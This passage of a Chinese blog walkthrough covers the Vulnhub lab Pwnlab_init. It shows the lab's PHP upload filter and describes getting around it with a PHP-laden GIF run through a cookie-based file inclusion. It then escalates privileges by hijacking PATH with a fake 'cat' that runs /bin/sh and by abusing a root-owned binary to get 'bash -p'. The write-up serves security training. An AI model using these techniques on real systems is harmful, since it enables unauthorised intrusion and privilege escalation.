+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])) &#123; <span class="keyword">die</span>(<span class="string">'You must be log in.'</span>); &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">''</span> <span class="attr">method</span>=<span class="string">'post'</span> <span class="attr">enctype</span>=<span class="string">'multipart/form-data'</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'file'</span> <span class="attr">name</span>=<span class="string">'file'</span> <span class="attr">id</span>=<span class="string">'file'</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">name</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'Upload'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">		$filename  = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">		$filetype  = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span></span><br><span class="line"><span class="php">		$uploaddir = <span class="string">'upload/'</span>;</span></span><br><span class="line"><span class="php">		$file_ext  = strrchr($filename, <span class="string">'.'</span>);</span></span><br><span class="line"><span class="php">		$imageinfo = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php">		$whitelist = <span class="keyword">array</span>(<span class="string">".jpg"</span>,<span class="string">".jpeg"</span>,<span class="string">".gif"</span>,<span class="string">".png"</span>); </span></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (!(in_array($file_ext, $whitelist))) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Not allowed extension, please upload images only.'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(strpos($filetype,<span class="string">'image'</span>) === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 001'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>($imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/gif'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpeg'</span> &amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/jpg'</span>&amp;&amp; $imageinfo[<span class="string">'mime'</span>] != <span class="string">'image/png'</span>) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 002'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span>(substr_count($filetype, <span class="string">'/'</span>)&gt;<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 003'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">		$uploadfile = $uploaddir . md5(basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])).$file_ext;</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"&lt;img src=\""</span>.$uploadfile.<span class="string">"\"&gt;&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">die</span>(<span class="string">'Error 4'</span>);</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>看一下过滤条件</p>
+<ol>
+<li>限制了文件类型</li>
+<li>限制了文件扩展</li>
+<li>md5加密了文件路径</li>
+<li>不能多个后缀<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/5.png" alt><br>修改了这三个地方上传, 结果上传成功了,返回了路径<br>upload/3208fd203ca8fdfa13bc98a4832c1396.gif<br>那么问题来了我们只上传了一个带php代码的gif, 现在没办法执行它, 这里开始在浏览index的源代码的时候发现, cookie中可以携带一个lang, 会调用这个lang的值, 所以我们尝试把shell的路径作为lang的值, 访问以下.<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/6.png" alt><br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/7.png" alt><br>bingo 现在我们获得了一个shell<br>看一下home<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /home</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/home</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="keyword">ls</span></span><br><span class="line">john  kane  kent  mike</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>尝试用数据库中的账号登录,查看home目录权限<br>切换用户, 可以登录kane并访问其目录下的文件<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/8.png" alt><br>尝试运行./msgmike时. 提示cat: /home/mike/msg.txt不存在, 看一下文件的权限<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/9.png" alt><br>是用户mike创建的一个文件, 调用了cat访问msg.txt, 我们进入/tmp目录并创建cat文件, 写入/bin/sh, 在PATH里面加入.<br>这样我们访问msgmike的时候就会调用当前目录下的cat文件并且执行文件的时候可以不用./文件名, 由此可以获得mike权限的bash</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=.<span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line">echo <span class="variable">$PATH</span></span><br><span class="line">.<span class="symbol">:/usr/local/sbin</span><span class="symbol">:/usr/local/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/10.png" alt></p>
+<p>进入mike的home<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/11.png" alt><br>这里发现root用户的文件, 文件内容调用了/bin/echo把输入的字符带存在messages.txt里, 我们可以利用他调用/bin/bash获取root的bash<br><img src="/2020/03/06/vulnhub-Pwnlab-init-WalkThrough/12.png" alt><br>成功, 如果是/bin/bash 需要加一个-p </p>
+<h5 id="p打开-privileged-mode-特权模式-。-在这个模式中，不会处理-ENV-和-BASH-ENV-文件，shell-函数不会从环境中继承，环境中如果有变量-SHELLOPTS，-也将被忽略。如果-shell-启动时的有效用户-组-ID-与真实用户-组-ID-不同，并且没有给出-p-选项，将执行这些操作，有效用户-ID-将设置为真实用户-ID。如果启动是给出了-p-选项，有效用户-ID-不会被重置。将这个选项关闭使得有效用户和组-ID-被设置为真实用户和组-ID。"><a href="#p打开-privileged-mode-特权模式-。-在这个模式中，不会处理-ENV-和-BASH-ENV-文件，shell-函数不会从环境中继承，环境中如果有变量-SHELLOPTS，-也将被忽略。如果-shell-启动时的有效用户-组-ID-与真实用户-组-ID-不同，并且没有给出-p-选项，将执行这些操作，有效用户-ID-将设置为真实用户-ID。如果启动是给出了-p-选项，有效用户-ID-不会被重置。将这个选项关闭使得有效用户和组-ID-被设置为真实用户和组-ID。" class="headerlink" title="-p打开 privileged mode (特权模式)。 在这个模式中，不会处理 $ENV 和 $BASH_ENV 文件，shell 函数不会从环境中继承，环境中如果有变量 SHELLOPTS， 也将被忽略。如果 shell 启动时的有效用户(组) ID 与真实用户(组) ID 不同，并且没有给出 -p 选项，将执行这些操作，有效用户 ID 将设置为真实用户 ID。如果启动是给出了 -p 选项，有效用户 ID 不会被重置。将这个选项关闭使得有效用户和组 ID 被设置为真实用户和组 ID。"></a>-p打开 privileged mode (特权模式)。 在这个模式中，不会处理 $ENV 和 $BASH_ENV 文件，shell 函数不会从环境中继承，环境中如果有变量 SHELLOPTS， 也将被忽略。如果 shell 启动时的有效用户(组) ID 与真实用户(组) ID 不同，并且没有给出 -p 选项，将执行这些操作，有效用户 ID 将设置为真实用户 ID。如果启动是给出了 -p 选项，有效用户 ID 不会被重置。将这个选项关闭使得有效用户和组 ID 被设置为真实用户和组 ID。</h5><p>知识难点:<br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank" rel="noopener">http://www.dankalia.com/tutor/01005/0100501004.htm</a><br><a href="https://hackmag.com/security/reach-the-root/" target="_blank" rel="noopener">https://hackmag.com/security/reach-the-root/</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9381409.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9381409.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            
+              <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
+            
+              <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+            
+              <a href="/tags/Pwnlab-init/" rel="tag"># Pwnlab_init</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/03/06/vulnhub-GoldenEye-v1-WalkThrough/" rel="next" title="vulnhub-GoldenEye-v1-WalkThrough">
+                  <i class="fa fa-chevron-left"></i> vulnhub-GoldenEye-v1-WalkThrough
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/03/06/vulnhub-SkyTower-WalkThrough/" rel="prev" title="vulnhub-SkyTower-WalkThrough">
+                  vulnhub-SkyTower-WalkThrough <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnlab-init"><span class="nav-text">Pwnlab_init</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web服务扫描"><span class="nav-text">web服务扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#p打开-privileged-mode-特权模式-。-在这个模式中，不会处理-ENV-和-BASH-ENV-文件，shell-函数不会从环境中继承，环境中如果有变量-SHELLOPTS，-也将被忽略。如果-shell-启动时的有效用户-组-ID-与真实用户-组-ID-不同，并且没有给出-p-选项，将执行这些操作，有效用户-ID-将设置为真实用户-ID。如果启动是给出了-p-选项，有效用户-ID-不会被重置。将这个选项关闭使得有效用户和组-ID-被设置为真实用户和组-ID。"><span class="nav-text">-p打开 privileged mode (特权模式)。 在这个模式中，不会处理 $ENV 和 $BASH_ENV 文件，shell 函数不会从环境中继承，环境中如果有变量 SHELLOPTS， 也将被忽略。如果 shell 启动时的有效用户(组) ID 与真实用户(组) ID 不同，并且没有给出 -p 选项，将执行这些操作，有效用户 ID 将设置为真实用户 ID。如果启动是给出了 -p 选项，有效用户 ID 不会被重置。将这个选项关闭使得有效用户和组 ID 被设置为真实用户和组 ID。</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="Sh4Nn0n">
+  <p class="site-author-name" itemprop="name">Sh4Nn0n</p>
+  <div class="site-description" itemprop="description">^.^</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fuziyuonly" title="GitHub &rarr; https://github.com/fuziyuonly" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lingwu111.github.io/" title="https://lingwu111.github.io/" rel="noopener" target="_blank">lingwu</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sh4Nn0n</span>
+</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
